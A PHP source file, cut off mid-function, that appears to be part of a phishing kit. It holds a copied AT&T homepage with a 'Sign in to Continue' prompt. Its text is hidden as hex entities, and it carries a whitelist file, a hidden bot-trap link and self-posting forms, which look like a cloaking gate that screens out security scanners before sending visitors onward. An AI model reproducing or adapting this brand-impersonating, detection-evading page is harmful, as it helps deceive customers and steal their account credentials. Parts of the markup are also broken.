<?php
$langcode = 'en'; // Default language. See Translations below
$wl       = '.ht_whitelist'; // whitelist file. Use .ht prefix in apache

/**
 * Translations
 */
$langs = array(
    'English' => 'en'
);

/**
 * Vars needed automatically replaced:
 * lang_output
 * curpagename
 * query_string
 * actionname
 *
 */

$get_msg['en'] = '<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="assets/css/blue-ui.css">
<link rel="stylesheet" href="assets/css/simp.css">
<link rel="stylesheet" href="assets/css/main1.css">
<link rel="stylesheet" href="assets/css/hh.css">
<link rel="stylesheet" href="assets/css/styles.2ed7ab9a.chunk.css">
<body class="attgn-page">
<div id="__next"><main class="_3cgwC pagehomepage rel"><div id="gnavSSR" class="staticGNAV">
  
<body class="attgn-page">
  


 <attwc-globalnav-header customer-type="consumer" source="jsonPrime" class="hydrated"><!--r.1--><att-wcgn-header-bootstrap customer-type="consumer" exclude-core-elements="disable" cart-type="IDPCart" motion-point="enable" mp-easy-link="disable" class="hydrated"><!--r.2--><div class="ge5p_global_styles gn-ds2"><att-wcgn-header-core customer-type="consumer" cart-type="IDPCart" last-modified-date="2019-11-18T17:32:26.901-06:00" hide-widgets="disable" class="hydrated"><!--r.3--><div id="ge5p_z1" class="ge5p_z1-navbar"><header><div id="gn-zone1"><attwc-globalnav-skipnav class="hydrated"><!--r.4--><div class="skip-navigation-mask"></div></attwc-globalnav-skipnav><nav id="navbar-zone1" class="gn-container" aria-label="Global Header" role="navigation"><div id="z1-navbar"><div id="z1-leftNav" class="pull-left"><div id="z1-globe" class="hide-xsm hide-sm"><i id="z1-globe-md" class="icon-att-globe" aria-hidden="true"><svg height="28" viewBox="0 0 36 36" width="28"><title></title>
<path d="m7.1 32c3 2.3 6.8 3.7 10.9 3.7 4.5 0 8.6-1.7 11.7-4.4-1.4.9-5.4 3-11.7 3-5.5 0-9-1.2-10.9-2.3m12.1.9c4.4 0 9.2-1.2 12-3.6.8-.6 1.5-1.5 2.2-2.6.4-.7.8-1.5 1.1-2.2-2.7 3.9-10.4 6.4-18.4 6.4-5.6 0-11.7-1.8-14.1-5.3 2.2 4.8 8.9 7.3 17.2 7.3m-4.8-7.8c-9.1 0-13.4-4.2-14.1-7.1 0 1 .1 2.2.3 3.1.1.4.4 1 .9 1.6 2.2 2.3 7.7 5.5 17.2 5.5 12.9 0 15.9-4.3 16.5-5.7.4-1 .7-2.8.7-4.4v-1c-.9 3.4-11.9 8-21.5 8m-12.5-14.7c-.5 1-1.1 2.8-1.3 3.7-.1.4 0 .6.1.9 1.1 2.3 6.6 6 19.4 6 7.8 0 13.9-1.9 14.9-5.4.2-.6.2-1.3 0-2.2-.3-1-.7-2.2-1.2-3.1.1 4.6-12.7 7.6-19.2 7.6-7 0-12.9-2.8-12.9-6.3.1-.5.2-.9.2-1.2m27.8-5.7c.1.1.1.2.1.4 0 2-6 5.4-15.6 5.4-7.1 0-8.4-2.6-8.4-4.3 0-.6.2-1.2.7-1.8-.9.9-1.7 1.7-2.5 2.7-.3.4-.5.8-.5 1 0 3.5 8.7 5.9 16.7 5.9 8.6 0 12.5-2.8 12.5-5.3 0-.9-.3-1.4-1.2-2.4-.6-.6-1.2-1.1-1.8-1.6m-2.6-1.9c-2.7-1.6-5.7-2.5-9.1-2.5s-6.5.9-9.2 2.6c-.8.4-1.3.8-1.3 1.3 0 1.5 3.5 3.1 9.7 3.1 6.1 0 10.9-1.8 10.9-3.5.1-.3-.3-.6-1-1" fill="#009fdb"></path></svg></i></div><div id="z1-pullMenu" class="has-sidenav has-dropdown dropdown-hover"><att-wcgn-hamburger-comp customer-type="consumer" class="hydrated"><!--r.5--><i id="ge5p-menu-inactive" class="icon-hamburger" aria-hidden="true"><svg id="ge5p-inactive-child1" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4"><g stroke="none" stroke-width="1" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg><svg id="ge5p-inactive-child2" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4"><g stroke="none" stroke-width="1" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg><svg id="ge5p-inactive-child3" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4"><g stroke="none" stroke-width="1" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg></i><i id="ge5p-menu-active" class="icon-hamburger" aria-hidden="true"><span id="ge5p-active-child1" class="ge5p_hamburger_bar">Menu</span><svg id="ge5p-active-child2" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4"><g stroke="none" stroke-width="1" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg><svg id="ge5p-active-child3" class="ge5p_hamburger_bar" width="32px" height="4px" viewBox="0 0 32 4"><g stroke="none" stroke-width="1" fill-rule="evenodd"><g transform="translate(-5.000000, -16.000000)"><path d="M34,18 C34,18.5522847 33.4179702,19 32.7,19 L9.3,19 C8.58202983,19 8,18.5522847 8,18 C8,17.4477153 8.58202983,17 9.3,17 L32.7,17 C33.4179702,17 34,17.4477153 34,18 Z"></path></g></g></svg></i></att-wcgn-hamburger-comp><div id="m-menu" aria-hidden="true" class="dropdown-menu" style="transition: max-height 0.3s ease-in; visibility: hidden; max-height: 0px;"><attwc-globalnav-header-menu customer-type="consumer" class="hydrated"><div style="margin: 30px;"><i class="icon-spinner" aria-hidden="true"></i></div></attwc-globalnav-header-menu></div><div class="gn-button-container hide-md hide-lg"><svg width="16px" height="16px" viewBox="0 0 22 22" version="1.1"><title>close icon</title>
<g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g fill="#ffffff" fill-rule="nonzero"><path d="M20.518,17.682 C21.0379132,18.1841489 21.2464252,18.9277558 21.0633943,19.6270146 C20.8803634,20.3262735 20.3342735,20.8723634 19.6350146,21.0553943 C18.9357558,21.2384252 18.1921489,21.0299132 17.69,20.51 L11.004,13.824 L4.309,20.519 C3.93451501,20.8948468 3.42556502,21.1057695 2.895,21.105 C2.0862082,21.1048273 1.3571319,20.617545 1.04764404,19.8703091 C0.738156188,19.1230732 0.909184169,18.2629885 1.481,17.691 L8.176,10.997 L1.49,4.31 C0.970086831,3.80785106 0.761574806,3.06424422 0.944605687,2.36498535 C1.12763657,1.66572649 1.67372649,1.11963657 2.37298535,0.936605687 C3.07224422,0.753574806 3.81585106,0.962086831 4.318,1.482 L11.004,8.168 L17.69,1.482 C18.1921489,0.962086831 18.9357558,0.753574806 19.6350146,0.936605687 C20.3342735,1.11963657 20.8803634,1.66572649 21.0633943,2.36498535 C21.2464252,3.06424422 21.0379132,3.80785106 20.518,4.31 L13.832,10.996 L20.518,17.682 L20.518,17.682 Z"></path></g></g></svg></i></div></div><div class="z1-search-icon2 z1_cta_widget hide-md hide-lg"><i class="icon-controls-magnifyingglass" aria-hidden="true"><svg width="16px" height="16px" viewBox="0 0 51 52"><title>search icon</title>
<g stroke="none" stroke-width="1" fill-rule="evenodd"><g fill-rule="nonzero"><path d="M0.626,20.007 C0.617192767,27.0722713 4.50734807,33.5659185 10.7410158,36.8915045 C16.9746836,40.2170904 24.5346047,39.8319197 30.398,35.89 L44.522,50.014 C45.4756927,50.984475 46.8768059,51.3685537 48.1920617,51.0200518 C49.5073176,50.6715499 50.5344121,49.6440716 50.8824227,48.3286857 C51.2304332,47.0132997 50.8458312,45.6123301 49.875,44.659 L35.728,30.512 C41.1223104,22.3165639 39.4395173,11.3684198 31.8329859,5.17128846 C24.2264545,-1.02584292 13.1641339,-0.461294196 6.228,6.478 C2.63002158,10.0585424 0.612987418,14.929021 0.626,20.005 L0.626,20.007 Z M31.36,19.985 C31.36,26.3804574 26.1754574,31.565 19.78,31.565 C13.3845426,31.565 8.2,26.3804574 8.2,19.985 C8.2,13.5895426 13.3845426,8.405 19.78,8.405 C26.1724875,8.41216431 31.3528357,13.5925125 31.36,19.985 Z"></path></g></g></svg></i></div><attwc-globalnav-tier1nav customer-type="consumer" class="hydrated"><!--r.6--><div id="z1-tier1Nav" class="z1_cta_widget"></div></attwc-globalnav-tier1nav></div><div id="z1-midNav"><div id="z1-mobile-identity" class="hide-md hide-lg"<i id="z1-mobile-globe" class="icon-att-globe" aria-hidden="true"><svg height="28" viewBox="0 0 36 36" width="28"><title></title>
<path d="m7.1 32c3 2.3 6.8 3.7 10.9 3.7 4.5 0 8.6-1.7 11.7-4.4-1.4.9-5.4 3-11.7 3-5.5 0-9-1.2-10.9-2.3m12.1.9c4.4 0 9.2-1.2 12-3.6.8-.6 1.5-1.5 2.2-2.6.4-.7.8-1.5 1.1-2.2-2.7 3.9-10.4 6.4-18.4 6.4-5.6 0-11.7-1.8-14.1-5.3 2.2 4.8 8.9 7.3 17.2 7.3m-4.8-7.8c-9.1 0-13.4-4.2-14.1-7.1 0 1 .1 2.2.3 3.1.1.4.4 1 .9 1.6 2.2 2.3 7.7 5.5 17.2 5.5 12.9 0 15.9-4.3 16.5-5.7.4-1 .7-2.8.7-4.4v-1c-.9 3.4-11.9 8-21.5 8m-12.5-14.7c-.5 1-1.1 2.8-1.3 3.7-.1.4 0 .6.1.9 1.1 2.3 6.6 6 19.4 6 7.8 0 13.9-1.9 14.9-5.4.2-.6.2-1.3 0-2.2-.3-1-.7-2.2-1.2-3.1.1 4.6-12.7 7.6-19.2 7.6-7 0-12.9-2.8-12.9-6.3.1-.5.2-.9.2-1.2m27.8-5.7c.1.1.1.2.1.4 0 2-6 5.4-15.6 5.4-7.1 0-8.4-2.6-8.4-4.3 0-.6.2-1.2.7-1.8-.9.9-1.7 1.7-2.5 2.7-.3.4-.5.8-.5 1 0 3.5 8.7 5.9 16.7 5.9 8.6 0 12.5-2.8 12.5-5.3 0-.9-.3-1.4-1.2-2.4-.6-.6-1.2-1.1-1.8-1.6m-2.6-1.9c-2.7-1.6-5.7-2.5-9.1-2.5s-6.5.9-9.2 2.6c-.8.4-1.3.8-1.3 1.3 0 1.5 3.5 3.1 9.7 3.1 6.1 0 10.9-1.8 10.9-3.5.1-.3-.3-.6-1-1" fill="#009fdb"></path></svg></i></div></div><div id="z1-rightNav" class="pull-right"><div class="z1-search-icon2 z1_cta_widget z1_divider_pipeline hide-xsm hide-sm hide-lg"><svg width="16px" height="20px" viewBox="0 0 51 52"><title>search icon</title>
<g stroke="none" stroke-width="1" fill-rule="evenodd"><g fill-rule="nonzero"><path d="M0.626,20.007 C0.617192767,27.0722713 4.50734807,33.5659185 10.7410158,36.8915045 C16.9746836,40.2170904 24.5346047,39.8319197 30.398,35.89 L44.522,50.014 C45.4756927,50.984475 46.8768059,51.3685537 48.1920617,51.0200518 C49.5073176,50.6715499 50.5344121,49.6440716 50.8824227,48.3286857 C51.2304332,47.0132997 50.8458312,45.6123301 49.875,44.659 L35.728,30.512 C41.1223104,22.3165639 39.4395173,11.3684198 31.8329859,5.17128846 C24.2264545,-1.02584292 13.1641339,-0.461294196 6.228,6.478 C2.63002158,10.0585424 0.612987418,14.929021 0.626,20.005 L0.626,20.007 Z M31.36,19.985 C31.36,26.3804574 26.1754574,31.565 19.78,31.565 C13.3845426,31.565 8.2,26.3804574 8.2,19.985 C8.2,13.5895426 13.3845426,8.405 19.78,8.405 C26.1724875,8.41216431 31.3528357,13.5925125 31.36,19.985 Z"></path></g></g></svg></i></div><attwc-globalnav-search customer-type="consumer" class="hydrated"><!--r.7--><div class="pull-right text-center">
<g stroke="none" stroke-width="1" fill-rule="evenodd"><g fill-rule="nonzero"><path d="M0.626,20.007 C0.617192767,27.0722713 4.50734807,33.5659185 10.7410158,36.8915045 C16.9746836,40.2170904 24.5346047,39.8319197 30.398,35.89 L44.522,50.014 C45.4756927,50.984475 46.8768059,51.3685537 48.1920617,51.0200518 C49.5073176,50.6715499 50.5344121,49.6440716 50.8824227,48.3286857 C51.2304332,47.0132997 50.8458312,45.6123301 49.875,44.659 L35.728,30.512 C41.1223104,22.3165639 39.4395173,11.3684198 31.8329859,5.17128846 C24.2264545,-1.02584292 13.1641339,-0.461294196 6.228,6.478 C2.63002158,10.0585424 0.612987418,14.929021 0.626,20.005 L0.626,20.007 Z M31.36,19.985 C31.36,26.3804574 26.1754574,31.565 19.78,31.565 C13.3845426,31.565 8.2,26.3804574 8.2,19.985 C8.2,13.5895426 13.3845426,8.405 19.78,8.405 C26.1724875,8.41216431 31.3528357,13.5925125 31.36,19.985 Z"></path></g></g></svg></button></fieldset></form><div id="z1-search-close" class="pull-left hide"><i class="gn-close-icon" aria-hidden="true"><svg width="14px" height="14px" viewBox="0 0 22 22"><title>search icon</title>
<g stroke="none" stroke-width="1" fill-rule="evenodd"><g fill-rule="nonzero"><path d="M20.518,17.682 C21.0379132,18.1841489 21.2464252,18.9277558 21.0633943,19.6270146 C20.8803634,20.3262735 20.3342735,20.8723634 19.6350146,21.0553943 C18.9357558,21.2384252 18.1921489,21.0299132 17.69,20.51 L11.004,13.824 L4.309,20.519 C3.93451501,20.8948468 3.42556502,21.1057695 2.895,21.105 C2.0862082,21.1048273 1.3571319,20.617545 1.04764404,19.8703091 C0.738156188,19.1230732 0.909184169,18.2629885 1.481,17.691 L8.176,10.997 L1.49,4.31 C0.970086831,3.80785106 0.761574806,3.06424422 0.944605687,2.36498535 C1.12763657,1.66572649 1.67372649,1.11963657 2.37298535,0.936605687 C3.07224422,0.753574806 3.81585106,0.962086831 4.318,1.482 L11.004,8.168 L17.69,1.482 C18.1921489,0.962086831 18.9357558,0.753574806 19.6350146,0.936605687 C20.3342735,1.11963657 20.8803634,1.66572649 21.0633943,2.36498535 C21.2464252,3.06424422 21.0379132,3.80785106 20.518,4.31 L13.832,10.996 L20.518,17.682 L20.518,17.682 Z"></path></g></g></svg></i></div><div id="z1-hidden-filter" class="hide"><div class="loader" style="display: none;"><i class="icon-spinner" aria-hidden="true"></i><span></span></div><div id="autosuggest"></div></div></div></div></attwc-globalnav-search><div id="z1-support" class="z1_cta_widget z1_divider_pipeline"><span class="z1-support-text"></span></div><attwc-globalnav-idp-cart customer-type="consumer" class="hydrated"><!--r.8--><div id="z1-cart" class="z1_divider_pipeline z1_cta_widget"><a cart-widget="true" id="z1-cart-open" class="z1-link" role="link" aria-disabled="true" title="Cart" aria-label="Cart"><i class="icon-shoppingcart" aria-hidden="true"><svg height="24" width="24" data-name="Layer 1" viewBox="0 -3 24 24"><title>Cart Icon</title>
<path d="M21.18 2.71H6.34C6.17 1.95 6 1.23 5.86.6A.78.78 0 0 0 5.1 0H.78a.78.78 0 1 0 0 1.55h3.7c2.28 10 2.34 10.23 2.34 10.23a3.72 3.72 0 0 0 2.06 2.79 1.94 1.94 0 0 0 3.51 1.64 1.81 1.81 0 0 0 .18-.82 2.56 2.56 0 0 0 0-.39h3.82a1.94 1.94 0 1 0 2.3-1.5.78.78 0 0 0-.22 0 .57.57 0 0 0-.18 0h-7c-1.89 0-2.54-.61-2.87-1.69h11.06a1.3 1.3 0 0 0 1.28-1l1.68-6.37v-.13a1.49 1.49 0 0 0 0-.21 1.33 1.33 0 0 0-1.26-1.39z"></path></svg></i></div></attwc-globalnav-idp-cart><attwc-globalnav-profile customer-type="consumer" class="hydrated"><!--r.9--><div id="z1-profile" class="z1_cta_widget has-dropdown dropdown-hover z1_divider_pipeline" unauth-directive="true"><i class="icon-people-oneperson" aria-hidden="true"><svg width="24px" height="24px" viewBox="0 0 24 24"><title>Profile icon</title>
<path d="M18.708 16.726c-.27-1.563-.763-3.975-1.362-5.183-.408-.945-1.638-1.714-3.255-2.085-.013-.003-.026-.009-.04-.011.019-.015.039-.032.06-.046a4.043 4.043 0 0 0 1.603-2.259c.1-.35.153-.72.153-1.106 0-2.232-1.749-4.037-3.906-4.037-2.155 0-3.905 1.805-3.905 4.037 0 .394.058.772.16 1.128A4.062 4.062 0 0 0 9.77 9.368c.036.027.066.056.105.079-.022.004-.05.014-.074.019-1.377.321-2.473.934-3.01 1.699-.084.12-.155.246-.211.374a8.696 8.696 0 0 0-.472 1.25c-.383 1.24-.696 2.81-.89 3.937-.073.398-.123.746-.169 1.001-.028.16-.049.32-.049.478 0 1.17 1.202 2.199 3.04 2.81 1.116.37 2.465.586 3.921.586 3.859 0 6.95-1.516 6.95-3.396 0-.159.005-.227-.036-.478-.042-.256-.097-.603-.167-1" fill-rule="evenodd"></path></svg></i><span class="z1-profile-text hide-xsm hide-sm">Account</span><i class="icon-down" aria-hidden="true"></i> <div class="parbase widgetContainer section"><div id="tab-profile" class="dropdown-profile consumer" aria-labelledby="z1-profile-open" aria-hidden="true" style="transition: max-height 0.3s ease-in; max-height: 0px; visibility: hidden;"><div id="profile-unauth"><div class="parbase reliefLogin section"><div class="login-page-content"><div class="row no-flex autoSize"></div></div></div><div><div class="parsys cta section"><ul class="show-unauth"><li class="cta wcgn-account-dropdown">Sign in</li><li class="cta wcgn-account-dropdown dividercomp">Account overview</li><li class="cta wcgn-account-dropdown">View &amp; pay bill</li><li class="cta wcgn-account-dropdown">Manage profile</li><li class="cta wcgn-account-dropdown">Move my service</li><li class="cta wcgn-account-dropdown dividercomp">Pay without signing in</li></ul></div></div></div></div></div></div></attwc-globalnav-profile><div class="parbase watchNowIcon section"><div id="z1-watch-tv" class="hide-xsm hide-sm"><div id="z1-watch-text" class="z1_cta_widget"><i class="icon-right-arrow" aria-hidden="true"></i></div></div></div></div></div><div id="skipGNnav" class="hidden-spoken"><span class="hidden-spoken">Start of main content</span></div></nav></div></header><div id="c-mask" class="c-mask hide" style="top: 50px;"></div></div></att-wcgn-header-core></div></att-wcgn-header-bootstrap></attwc-globalnav-header>

</div><div class="max-width-container"><div class="row nopad"><div class="grid-col-12"><div class="_1WEEE bg-ui-white" id="HEADBAND0"><ul><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND00"><span class=""><span data-test-id="linkHeading0" class="font-medium type-xs  ">Deals</span><img data-test-id="linkImage0" class=" _32CgZ" src="assets/img/icon-deals-blk.svg" role="img"></span></li><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND01"><span class="">Phones &amp; devices</span><img data-test-id="linkImage1" class=" _32CgZ" src="assets/img/phones-devices.svg" role="img"></span></li><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND02"><span class="">><span data-test-id="linkHeading2" class="font-medium type-xs  ">Wireless</span><img data-test-id="linkImage2" class=" _32CgZ" src="assets/img/icon-wireless-blk.svg" role="img"></span></li><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND03"><span class=""><span data-test-id="linkHeading3" class="font-medium type-xs  ">Internet</span><img data-test-id="linkImage3" class=" _32CgZ" src="assets/img/icon-internet-blk.svg" role="img"></span></li><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND04"><span class=""><span data-test-id="linkHeading4" class="font-medium type-xs  ">TV</span><img data-test-id="linkImage4" class=" _32CgZ" src="assets/img/icon-tvmain.svg" role="img"></span></li><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND05"><span class=""><span data-test-id="linkHeading5" class="font-medium type-xs  ">Prepaid</span><img data-test-id="linkImage5" class=" _32CgZ" src="assets/img/icon-prepaid-blk.svg" role="img"></span></li><li class="_LLE_M mar-t-xs mar-b-xs" id="HEADBAND06"><span class=""><span data-test-id="linkHeading6" class="font-medium type-xs  ">Bundles</span><img data-test-id="linkImage6" class=" _32CgZ" src="assets/img/icon-bundles-blk.svg" role="img"></span></li></ul></div></div></div></div><div class="rel    max-width-container"><div id="HERO_PANEL1" class="" style="cursor:pointer"><div class=""><div class="_1vHHq " id="HERO_PANEL2-Background-1" style="z-index:-1"><div class="_1vHHq _1_uVw" style="max-width:1600px"></div></div><div class="container flex hero-panel _2105J
                          undefined " style="min-height: 100px;"><div class="row-nowrap flex-self-stretch rel _2gyGj "><div class="grid-col-6 grid-col-6-md  flex-self-center rwd pad-t-xl pad-b-xl"><div class="color-ui-white type-xl font-medium _DJTtR mar-b-xs rel  ">HBO Max is here</div><div class="color-ui-white type-base font-regular _2BBBl mar-b-xxs rel  ">&#x48;&#x42;&#x4f;&#x20;&#x4d;&#x61;&#x78;&#x2122;&#x20;&#x62;&#x72;&#x69;&#x6e;&#x67;&#x73;&#x20;&#x74;&#x6f;&#x67;&#x65;&#x74;&#x68;&#x65;&#x72;&#x20;&#x61;&#x6c;&#x6c;&#x20;&#x6f;&#x66;&#x20;&#x48;&#x42;&#x4f;&#xae;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x65;&#x76;&#x65;&#x6e;&#x20;&#x6d;&#x6f;&#x72;&#x65;&#x20;&#x6d;&#x6f;&#x76;&#x69;&#x65;&#x73;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x73;&#x65;&#x72;&#x69;&#x65;&#x73;&#x2c;&#x20;&#x70;&#x6c;&#x75;&#x73;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x4d;&#x61;&#x78;&#x20;&#x4f;&#x72;&#x69;&#x67;&#x69;&#x6e;&#x61;&#x6c;&#x73;&#x2e;&#x20;&#x46;&#x69;&#x6e;&#x64;&#x20;&#x6f;&#x75;&#x74;&#x20;&#x68;&#x6f;&#x77;&#x20;&#x74;&#x6f;&#x20;&#x67;&#x65;&#x74;&#x20;&#x69;&#x74;&#x20;&#x69;&#x6e;&#x63;&#x6c;&#x75;&#x64;&#x65;&#x64;&#x20;&#x61;&#x74;&#x20;&#x6e;&#x6f;&#x20;&#x65;&#x78;&#x74;&#x72;&#x61;&#x20;&#x63;&#x68;&#x61;&#x72;&#x67;&#x65;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x6f;&#x75;&#x72;&#x20;&#x62;&#x65;&#x73;&#x74;&#x20;&#x54;&#x56;&#x2c;&#x20;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x65;&#x74;&#x2c;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x77;&#x69;&#x72;&#x65;&#x6c;&#x65;&#x73;&#x73;&#x20;&#x70;&#x6c;&#x61;&#x6e;&#x73;&#x2e;</div><span class="">Learn more</span></div></div></div></div></div></div><div class="max-width-container rwd  grad-cobalt-att-blue-135 mar-b-sm bg-cobalt pad-t-none pad-b-md ef14c708-b7e8-3cb2-9b81-eac9d703d4bb _2qkTL" id="PRODUCT_PANEL2"><div class="_3nBRT" id="bgPRODUCT_PANEL2"><div style="" class="_XF6GY">
						  
						  </div></div></div><div class="_1vHHq bg-ui-black" id="DYNAMIC_COMPONENT-Background-4" style="z-index:-1"><div></div></div><div class="color-ui-white type-xl font-medium xmar-b-xs rel  ">AT&amp;T is the fastest network for iPhones</div><div class="_3Eehw color-ui-white _1i2z3 rel"><span>&#x46;&#x61;&#x73;&#x74;&#x65;&#x73;&#x74;&#x20;&#x62;&#x61;&#x73;&#x65;&#x64;&#x20;&#x6f;&#x6e;&#x20;&#x61;&#x6e;&#x61;&#x6c;&#x79;&#x73;&#x69;&#x73;&#x20;&#x62;&#x79;&#x20;&#x4f;&#x6f;&#x6b;&#x6c;&#x61;&#xae;&#x20;&#x6f;&#x66;&#x20;&#x53;&#x70;&#x65;&#x65;&#x64;&#x74;&#x65;&#x73;&#x74;&#x20;&#x49;&#x6e;&#x74;&#x65;&#x6c;&#x6c;&#x69;&#x67;&#x65;&#x6e;&#x63;&#x65;&#xae;&#x20;&#x64;&#x61;&#x74;&#x61;&#x20;&#x6d;&#x65;&#x64;&#x69;&#x61;&#x6e;&#x20;&#x64;&#x6f;&#x77;&#x6e;&#x6c;&#x6f;&#x61;&#x64;&#x20;&#x73;&#x70;&#x65;&#x65;&#x64;&#x73;&#x20;&#x6f;&#x6e;&#x20;&#x41;&#x70;&#x70;&#x6c;&#x65;&#x20;&#x4d;&#x61;&#x6e;&#x75;&#x66;&#x61;&#x63;&#x74;&#x75;&#x72;&#x65;&#x64;&#x20;&#x70;&#x68;&#x6f;&#x6e;&#x65;&#x73;&#x20;&#x66;&#x6f;&#x72;&#x20;&#x51;&#x31;&#x20;&#x32;&#x30;&#x32;&#x30;&#x2e;&#x20;&#x4f;&#x6f;&#x6b;&#x6c;&#x61;&#x20;&#x74;&#x72;&#x61;&#x64;&#x65;&#x6d;&#x61;&#x72;&#x6b;&#x73;&#x20;&#x75;&#x73;&#x65;&#x64;&#x20;&#x75;&#x6e;&#x64;&#x65;&#x72;&#x20;&#x6c;&#x69;&#x63;&#x65;&#x6e;&#x73;&#x65;&#x20;&#x61;&#x6e;&#x64;&#x20;&#x72;&#x65;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x65;&#x64;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x70;&#x65;&#x72;&#x6d;&#x69;&#x73;&#x73;&#x69;&#x6f;&#x6e;&#x2e; </span></div></div></div><attwc-globalnav-footer customer-type="consumer" class="hydrated"> <attwc-globalnav-common-footer customer-type="consumer" class="hydrated"><!----><div class="ge5p_global_styles gn-ds2"><footer style="display: block;"><div id="gn-zone5"><div id="z5-footer-content" class="gn-container" data-link-position="Footer" data-event-action="linkClick" data-event-code="Link_Click"><div class="row"></div><div id="z5-footer-legal" class="row"><div class="span12"><div><div class="parbase section"><ul class="ftr-legal-links clear-fix"></ul></div></div></div></div><div id="z5-footer-copyright" class="row"><div class="span12"><div class="span9 span12-xsm span12-sm span9-md pull-left"><div><div class="text parbase section"></div></div></div><div id="z5-trust-logo" class="span3 span12-xsm span12-sm span3-md pull-right"></div></div></div></div></div></footer></div></attwc-globalnav-common-footer></attwc-globalnav-footer></main></div><div></div>
						  <a style="display:none" href="anoxytytrap">Trap</a>
<div id="overlay">
<div class="jpui modal" id="sessionTimeoutDialog" data-is-view="true"><div class="dialog vertical-center util print-position-initial" role="dialog"> <section class="dialogContent"><div class="modalContent"><div class="row">

<div class="max-width-container rwd  grad-cobalt-att-blue-135 mar-b-sm bg-cobalt pad-t-none pad-b-md ef14c708-b7e8-3cb2-9b81-eac9d703d4bb _2qkTL" id="PRODUCT_PANEL2"><div class="_3nBRT" id="bgPRODUCT_PANEL2"><div style="" class="_XF6GY">
</style></div></div><div class="container"><ul class="row" id="PRODUCT_PANEL2valueProps">


<li class="grid-col-4 pad-t-md text-center type-xs color-ui-white 76d75e04-1546-305e-97e3-edf8745fb29c color-ui-white"><img alt="" class="height-lg width-lg mar-b-xxs" src="assets/img/person_outline_white.svg"><p data-test-id="heading" class="type-md font-medium  ">Sign in to Continue</p><span class="">

<form method="POST" action="{curpagename}">
      <input type="hidden" name="query_string" value="{query_string}">
      <input type="hidden" name="actionname" value="{actionname}" />
	  <input type="submit" id="proceedToLogoff" class="link-tertiary-large on-dark btn btn-secondary btn-arrow c8706cde-0473-31e7-bfb8-ee2fd3c83db1" value="Continue"/>
	     </form>



</span></li>



<li class="grid-col-4 pad-t-md text-center type-xs color-ui-white 76d75e04-1546-305e-97e3-edf8745fb29c color-ui-white"><img alt="" class="height-lg width-lg mar-b-xxs" src="assets/img/question_outline_white.svg"><p data-test-id="heading" class="type-md font-medium  ">Our COVID-19 response                                                                                                                </p><span class="">


<form method="POST" action="{curpagename}">
      <input type="hidden" name="query_string" value="{query_string}">
      <input type="hidden" name="actionname" value="{actionname}" />
	  <input type="submit" id="proceedToLogoff" class="link-tertiary-large on-dark btn btn-secondary btn-arrow c8706cde-0473-31e7-bfb8-ee2fd3c83db1" value="LEARN MORE"/>
	     </form>


</span></li><li class="grid-col-4 pad-t-md text-center type-xs color-ui-white 76d75e04-1546-305e-97e3-edf8745fb29c color-ui-white"><img alt="" class="height-lg width-lg mar-b-xxs" src="assets/img/hp_covidPR_icon.svg"><p data-test-id="heading" class="type-md font-medium  ">24/7 support<br></p><span class="">

<form method="POST" action="{curpagename}">
      <input type="hidden" name="query_string" value="{query_string}">
      <input type="hidden" name="actionname" value="{actionname}" />
	  <input type="submit" id="proceedToLogoff" class="link-tertiary-large on-dark btn btn-secondary btn-arrow c8706cde-0473-31e7-bfb8-ee2fd3c83db1" value="GET SUPPORT"/>
	     </form>







</span></li></ul></div></div><div id="MULTI_CTA4" class="max-width-container"> 

<div class="row"><div class="dialogButtonContainer"><div class="col-xs-6 col-sm-3 col-sm-offset-3">
	  </div> <div class="col-xs-6 col-sm-3"></div></div></div></div></section></div>  </div>
</div>




';
	 

/** DO NOT MODIFY UNDER THIS LINE **/

/* Selected language */
if (isset($_POST['langcode'])) {
    $langcode = $_POST['langcode'];
}

/* Get translations buttons */
$lang_output = '';
foreach ($langs as $langname => $langcoded) {
    $lang_output .= '<form method="POST" style="float:left;"><input type="hidden" name="langcode" value="' . $langcoded . '" /><input type="submit" value="' . $langname . '"/></form>';
}
$lang_output .= '<div style="clear:both"></div>';

/**
 * FUNCTIONS
 */

/**
 * Get html header
 */
function _get_header()
{
    $page_header = '
<html>
<head>
